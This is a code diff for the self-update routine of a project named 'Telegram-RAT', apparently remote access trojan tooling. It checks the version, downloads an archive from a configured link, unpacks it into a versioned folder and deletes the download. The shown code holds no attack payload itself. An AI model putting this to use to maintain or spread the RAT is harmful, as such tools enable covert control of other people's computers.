@@ -19,21 +19,18 @@ if RAT_Version == '2.6':
 	print('No available updates')
 	input()
 else:
-	print('Update available. Update now? y/n')
-	print('\nChangelogs:\n' + RAT_Changelogs + '\n')
-	if input().lower() == 'y'.lower():
-		for Downloading in '\nDownloading update..':
-			time.sleep(0.05)
-			sys.stdout.write(Downloading)
-			sys.stdout.flush()
-		urllib.request.urlretrieve(RAT_Link, RAT_Path)
-
-		for Unpacking in '\nUnpacking archive..':
-			time.sleep(0.05)
-			sys.stdout.write(Unpacking)
-			sys.stdout.flush()
-		shutil.unpack_archive(RAT_Path, 'Telegram-RAT')
-		time.sleep(3)
-		print('\nUpdate installed.')
-		os.remove(RAT_Path)
+	if os.path.exists('Updated Version ' + RAT_Version):
+		print('Update is already installed.')
 		input()
+	else:
+		print('Update available. Update now? y/n')
+		print('\nChangelogs:\n' + RAT_Changelogs + '\n')
+		if input().lower() == 'y'.lower():
+			print('\nDownloading update..')
+			urllib.request.urlretrieve(RAT_Link, RAT_Path)
+			print('Unpacking archive..')
+			shutil.unpack_archive(RAT_Path, 'Updated Version ' + RAT_Version)
+			os.remove(RAT_Path)
+			time.sleep(3)
+			print('Update installed.')
+			input()
